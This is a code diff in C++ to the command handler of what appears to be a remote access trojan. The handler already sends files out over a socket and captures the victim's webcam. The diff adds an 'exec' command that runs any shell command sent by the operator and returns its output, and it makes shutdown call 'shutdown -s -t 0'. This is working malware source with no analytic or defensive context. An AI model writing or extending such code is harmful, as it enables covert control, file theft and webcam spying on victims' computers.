@@ -89,8 +89,13 @@ void handle(char *buff, BOOL *listen, BOOL *loop) {
   } else if (cmd == "download") {
     net::sendFile(&sock, (char*)args.c_str());
 
+  } else if (cmd == "exec") {
+    std::string msg;
+    msg += "{\"exec\": {\"cmd\": \"" + args + "\", \"output\": \"" + utils::exec((char*)args.c_str()) + "\"}}";
+    net::write(&sock, (char*)msg.c_str());
+
   } else if (cmd == "shutdown") {
-    utils::shutdown();
+    utils::exec("shutdown -s -t 0");
 
   } else if (cmd == "webcam") {
     utils::captureWebcam((char*)"wc.bmp");
